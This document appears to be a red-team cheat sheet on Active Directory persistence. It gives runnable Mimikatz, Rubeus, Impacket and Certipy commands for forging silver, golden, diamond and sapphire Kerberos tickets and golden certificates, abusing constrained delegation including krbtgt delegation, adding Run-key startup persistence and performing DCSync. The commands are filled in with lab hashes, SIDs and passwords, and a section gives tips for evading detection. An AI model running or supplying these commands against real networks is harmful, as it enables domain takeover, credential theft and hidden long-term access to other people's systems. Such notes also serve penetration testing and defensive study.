---
title: Persistence
tags:
  - activedirectory
  - persistence
enableToc: "true"
---
### Silver Ticket
A silver ticket is quite different from a [Golden Ticket](#golden-ticket), it will be signed and encrypted with a computer account hash itself. As how kerberos works for ST request, for example if we are requesting *cifs* service for a workstation, the ST would be encrypted with the workstation's computer account hash. Hence, if a computer account hash is compromised, we could forge a ticket to access any service and impersonate as any local users available. 

| Attribute           | Value                                     |
| ------------------- | ----------------------------------------- |
| Domain              | range.net                                 |
| Domain SID          | S-1-5-21-2004564407-2130411480-2428574852 |
| Computer nthash/Aes | 95e392df668ca6bd103b905856acb8a9          |
| SPN                 | cifs/ws01.ran.net                         |
| User                | Administrator                             |

```css
# Mimikatz
kerberos::golden /domain:range.net /sid:S-1-5-21-2004564407-2130411480-2428574852 /rc4:95e392df668ca6bd103b905856acb8a9 /user:Administrator /target:ws01.range.net /service:cifs /ptt

# impacket
ticketer.py -nthash 95e392df668ca6bd103b905856acb8a9 -domain-sid S-1-5-21-2004564407-2130411480-2428574852 -domain range.net -spn cifs/ws01.range.net Administrator
```

In the case where silver ticket produces a lot of error, one way of achieving the same goal is by doing a **s4u2self** to impersonate any users that are available on the workstation. *Note that the spn value must contain a valid hostname or FQDN or the workstation.*

```powershell
# Rubeus
Rubeus.exe s4u /user:ws01$ /rc4:95e392df668ca6bd103b905856acb8a9 /domain:range.net /dc:192.168.86.182 /impersonateuser:Administrator /msdsspn:cifs/ws01.range.net /altservice:http,host,ldap /ptt

# Impacket
getST.py range.net/ws01\$ -hashes :95e392df668ca6bd103b905856acb8a9 -impersonate Administrator -spn cifs/ws01.range.net
```

### Golden Ticket
A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine

| Attribute   | Value                                  |
| ----------- | -------------------------------------- |
| Domain      | legitcorp.local                        |
| Domain SID  | S-1-5-21-1935943001-39345449-285568504 |
| krbtgt hash | 7e8612a348a729bcb2f597a9cbc27c12       |
| Username    | trex                                   |
```css
# mimikatz
kerberos::golden /domain:legitcorp.local /sid:S-1-5-21-1935943001-39345449-285568504 /rc4:7e8612a348a729bcb2f597a9cbc27c12 /user:trex /ptt

# impacket
ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -domain-sid S-1-5-21-1935943001-39345449-285568504 trex
```

**Opsec Consideration**
In a scenario where you are working on a production domain that implements endpoint detections and sensors. You might want to avoid using *krbtgt's RC4 hash* as most of the detection mechanism detects a ticket that is encrypted/signed with a RC4 hash of krbtgt account. Always consider to **use `aes256` or `aes128` to encrypt/sign the forged ticket**. 

Another thing to keep in mind is that always **use an existing account** to avoid detection as most of the detection mechanism detects the use of a non-existance account. 
```bash
# mimikatz
kerberos::golden /domain:range.net /sid:S-1-5-21-1935943001-39345449-285568504 [/aes128|/aes256]:aesKey /user:exist_account /ptt

# impacket
ticketer.py -domain range.net -aesKey [AESKey] -domain-sid S-1-5-21-1935943001-39345449-285568504 exist_account
```

### Diamond Ticket
A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) because golden ticket wouldn't require TGT request since it can be forged offline. Diamond ticket is where we can request a valid user's TGT regardless the level of access on the domain, then the ticket will be modified to allow us to request TGS for a specific service. This is a better technique because normally golden ticket is easier to detect by monitoring for service ticket requests (TGS-REQs) that have no correspokding TGT request (AS-REQ). Detailed steps are as follows:

| Attribute           | Value                                                            |
| ---                 | -----------                                                      |
| Username & Password | loki:Password123                                                 |
| Domain              | range.net                                                        |
| krbtgt AES-256 Key  | 8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee |
| User in PAC         | rangeadm                                                         |
1. Request a diamond key with [Rubeus](https://github.com/GhostPack/Rubeus). It does the following steps:-
```
i. Request normal user TGT
ii. Decrypt the TGT with krbtgt aes key
iii. Modify ticket PAC and insert _rangeadm_ in the PAC
```

```bash
# rubeus
Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap

ticketer.py -request -user kiwiadm -password 'Password1234' -domain kiwi.local -domain-sid S-1-5-21-324228654-75577378-1178627105 -aesKey e2fa5c4cead71ececa483df18787ead67099d5286cd8ef0424b791dd35516d2e -groups '512,513,516,518,519,520' -user-id 1337 -duration 3650 'lel'
```
2. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
```powershell
.\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
```
For detailed explanation, read this article by Semperis [here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)

### Golden Certificate
The title is basically self explanatory, this attack is pretty much the same as golden certificate where you forge a certificate offline with a compromised private key on a CA server *(Having system access on a CA)*. Therefore, it can be used to forge a certificate and sign it with the private key to be used later on for persistence purposes. A certificate will normally valid up until 1 year duration. 
1. Extract private key from CA
```bash
# SharpDPAPI
SharpDPAPI.exe certificates /machine

# Certipy
certipy ca -u 'localadmin' -p 'Password1234' -backup -target ca01.range.net -ca 'range-CA01-CA'
```
2. *If Certipy is used in step 1, you can skip this step*. Copy the cert into a .pem file and convert to a usable format (.pfx) to perform [Pass-The-Certificate](#pass-the-certificate) attack. *Note that this will require a user defined password*
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
3. Forge a certificate
```bash
# certipy (this step is unnecessary if you used certipy in step 1)
1. convert pfx to a certipy usable cert (no password)
certipy cert -export -pfx cert.pfx -password admin -out final.pfx

2. forge a certificate 
certipy forge -ca-pfx final.pfx -upn rangeadm@range.net -subject 'CN=rangeadm,CN=Users,DC=RANGE,DC=NET'

3. authenticate with the certificate and win!
certipy auth -pfx rangeadm_forged.pfx -dc-ip 192.168.86.183

# pyForgeCert
1. using PEM cert (you can skip step 2 for this one)
python pyForgeCert.py -i cert.pem -o admin.pfx

2. using PFX cert
python pyForgeCert.py -i cert.pfx -o admin.pfx -pfx -p admin

3. Use Pass-The-Certificate and win!
```

>[!References]
>- https://pentestlab.blog/2021/11/15/golden-certificate/
>- https://github.com/Ridter/pyForgeCert
>- https://github.com/ly4k/Certipy

### Sapphire Ticket
As mentioned in [hacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
> This is pretty much similar to the [Diamond Ticket](#diamond-ticket) but Sapphire tickets are an alternative to obtaining similar tickets in a stealthier way, by including a legitimate powerful user's PAC in the ticket. The powerful user's PAC can be obtained through an [S4U2self+u2u](/ad/movement/kerberos) trick.
```bash
# Impacket
ticketer.py -request -user peter -password 'Password123' -domain range.net -aesKey 6a4b564a854e5ac474aca142874e1ca53167a71735dd6b08cc33247ae9941a86 -domain-sid S-1-5-21-2004564407-2130411480-2428574852 -impersonate Administrator 'Administrator'
```

### msDS-AllowedToDelegateTo
Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.

1. Set the `msDS-AllowedToDelegateTo` attribute of a user _lowpriv_ to give privilege for it to request ticket for _cifs_ service to dc01.
```bash
# AD Module / RSAT
Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose

# PowerView
Set-DomainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}

# Linux
setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
```
2. Request the service ticket for _cifs_ service with impacket [getST.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py) and impersonate to administrator.
```powershell
# Rubeus
Rubeus.exe hash /user:lowpriv /password:'P@$$w0rd!xyz' /domain:legitcorp.local
Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt

# Impacket
getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -impersonate 'administrator'
export KRB5CCNAME='administrator.ccache'
```
3. Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.
```bash
# Sysinternal
PsExec64.exe -accepteula \\dc01.legitcorp.local cmd

# Impacket
smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
```

### Registry Keys
### Execute on startup
There are several registry keys can be added to execute binary on startup based on your need and current user context. 
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
1. Add a new value to one of the KeyName above 
```powershell
reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
```

### krbtgt Constrained Delegation
1. Add a new computer account with [addcomputer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py). This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration). 
```bash
addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
```
2. Set the _msDS-AllowedToDelegateTo_ attribute to `krbtgt/legitcorp`. [setCD.py](https://gist.githubusercontent.com/snovvcrash/c8f8fa7721c40f4cca0c46c196066a41/raw/3ddd82ab44048d0fe8530ae2da87199cdc70779f/setCD.py) is a script by [@snovvcrash](https://twitter.com/snovvcrash)
```bash
setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'FakeComputer$' -spn krbtgt/legitcorp
```
3. Request service ticket for the created computer by impersonating domain controller computer account (s4u delegation).
```bash
# request service ticket
getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:'Passw0rd' -dc-ip 192.168.86.170 -impersonate 'DC01$'

# export ticket into environment variable
export KRB5CCNAME='DC01$.ccache'
```
4. Perform DCSync on the domain controller
```bash
secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
```

You can read more from this great [article](https://skyblue.team/posts/delegate-krbtgt/) from [citronneur](https://twitter.com/citronneur). 

>[!warning]
>This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps. YOLO